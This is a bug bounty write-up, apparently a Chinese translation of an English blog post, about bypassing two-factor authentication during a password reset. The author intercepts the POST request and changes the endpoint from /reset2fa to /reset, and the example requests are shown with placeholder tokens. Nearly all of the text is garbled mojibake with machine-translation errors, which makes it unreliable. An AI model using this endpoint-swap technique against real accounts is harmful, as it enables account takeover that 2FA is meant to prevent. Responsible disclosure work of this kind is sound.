# é‡ç½®å¯†ç æ—¶æˆ‘æ˜¯å¦‚ä½•ç»•è¿‡ 2FA çš„

> åŸæ–‡ï¼š<https://infosecwriteups.com/how-i-bypass-2fa-while-resetting-password-3f73bf665728?source=collection_archive---------0----------------------->

> è¿™æ˜¯ä¸€ä¸ªåœ¨â€œHackeroneâ€ä¸Šçš„ç§äººç¨‹åºï¼Œæˆ‘åœ¨å¿ƒé‡Œè®¾å®šäº†ç›®æ ‡ï¼Œæˆ‘å¿…é¡»ç»•è¿‡ 2faï¼Œæ‰€ä»¥æˆ‘æ£€æŸ¥äº†æ¯ä¸€ç§ç»•è¿‡â€œ**åŒå› ç´ è®¤è¯**â€çš„æ–¹æ³•
> 
> ä¸ºäº†æ›´å¥½çš„ç†è§£ï¼Œæˆ‘æŠŠè¿™ä¸ªåšå®¢åˆ†æˆäº†ä¸¤éƒ¨åˆ†

**1:äº†è§£ Web åº”ç”¨ç¨‹åºçš„åŠŸèƒ½ã€‚**

**2:ç»•è¿‡åŒå› ç´ è®¤è¯ã€‚**

# æˆ‘ä»¬å¼€å§‹å§

æˆ‘ä¸èƒ½é€éœ²ç½‘ç«™çš„åå­—ï¼Œå°±å½“æ˜¯â€œTarget.comâ€å§

åœ¨æ£€æŸ¥äº†æ‰€æœ‰å¯èƒ½çš„æ–¹æ³•åï¼Œæˆ‘å¼€å§‹é‡ç½®å¯†ç åŠŸèƒ½ï¼Œæˆ‘å‘é€äº†ä¸€ä¸ªå¯†ç é‡ç½®é“¾æ¥ï¼Œå¹¶åœ¨æˆ‘çš„æµè§ˆå™¨ä¸­æ‰“å¼€äº†å®ƒã€‚

" https://ABC . target . com/reset/<token>"</token>

![](img/9f1f5b228c7168e365dfeb9333f9bc52.png)

è¾“å…¥æ–°å¯†ç 

æˆ‘è¾“å…¥æ–°çš„å¯†ç ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥æŒ‰é’®ï¼Œå¹¶åœ¨æ‰“å—ä¸­æ•æ‰åˆ°è¯·æ±‚ã€‚

> è¯·æ±‚:

POST **/reset2fa** HTTP/1.1

ä¸»æŒäºº:abc.target.com

..

_ csrf =<token>& reset _ key =<key>& password = Test @ 123</key></token>

è½¬å‘æ­¤è¯·æ±‚åï¼Œå®ƒè¢«é‡å®šå‘åˆ° 2fa é¡µé¢ğŸ˜“

![](img/30c68f476f30ac8121035275f5017e65.png)

2fa é¡µé¢

ç°åœ¨æˆ‘**ä»æˆ‘çš„è´¦æˆ·**ç¦ç”¨ 2faï¼Œä»¥æ£€æŸ¥å½“ 2fa è¢«å¯ç”¨&ç¦ç”¨æ—¶ä¸¤ä¸ªè¯·æ±‚ä¹‹é—´çš„å·®å¼‚ã€‚

ç°åœ¨ï¼Œå†æ¬¡ç”¨åŒæ ·çš„æ­¥éª¤ï¼Œæˆ‘è¯·æ±‚ä¸€ä¸ªæ–°çš„å¯†ç ã€‚

è¾“å…¥æ–°å¯†ç å¹¶åœ¨æ‰“å—æ—¶æ•è·è¯·æ±‚ã€‚

![](img/9f1f5b228c7168e365dfeb9333f9bc52.png)

è¾“å…¥æ–°å¯†ç 

> **è¯·æ±‚**

POST **/reset** HTTP/1.1

ä¸»æŒäºº:abc.target.com

..

_ csrf =<token>& reset _ key =<key>& password = Test @ 123</key></token>

è½¬å‘è¯·æ±‚åï¼Œå®ƒè¢«é‡å®šå‘åˆ°ä»ªè¡¨æ¿ã€‚

# æ—è·¯éƒ¨åˆ†

é€šè¿‡æ¯”è¾ƒè¯·æ±‚ï¼Œæˆ‘æ³¨æ„åˆ°â€œ **POST /reset** â€è¢«é‡å®šå‘åˆ°ä»ªè¡¨æ¿ï¼Œè€Œâ€œ **POST /reset2fa** â€è¢«é‡å®šå‘åˆ° 2fa é¡µé¢ã€‚

ä¸ºäº†ç»•è¿‡**ï¼Œæˆ‘å†æ¬¡å¯ç”¨äº† 2fa**å¹¶è¦æ±‚é‡ç½®å¯†ç ã€‚

" https://ABC . target . com/reset/<token>"</token>

![](img/2b0eaebbab820bef68c888380e044221.png)

è¾“å…¥æ–°å¯†ç å¹¶åœ¨æ‰“å—æ—¶æ•è·è¯·æ±‚

> åŸå§‹è¯·æ±‚:

POST**/reset 2 fa**HTTP/1.1

ä¸»æŒäºº:abc.target.com

..

_ csrf =<token>& reset _ key =<key>& password = Test @ 123</key></token>

å°†**POST/reset 2 fa**æ›´æ”¹ä¸º**â€œPOST/resetâ€**

> **ä¿®æ”¹åçš„è¯·æ±‚:**

POST **/reset** HTTP/1.1

ä¸»æŒäºº:abc.target.com

..

_ csrf =<token>& reset _ key =<key>& password = Test @ 123</key></token>

**è½¬å‘è¯·æ±‚å¹¶é‡å®šå‘è‡³ä»ªè¡¨æ¿ğŸ˜**

![](img/1414459dd1a9a9a77b7d19e943703923.png)

å‘è®¡åˆ’æŠ¥å‘Šå¹¶å¥–åŠ±$$$

![](img/cf7d721fa23725a34721ca1d30e4f1fb.png)

è”ç³»æˆ‘:

[Linkedin](http://www.linkedin.com/in/sufiyan-gouri):[sufiyan-gouri](http://www.linkedin.com/in/sufiyan-gouri)

[æ¨ç‰¹](https://twitter.com/gouri_sufyan) : @gouri_sufyan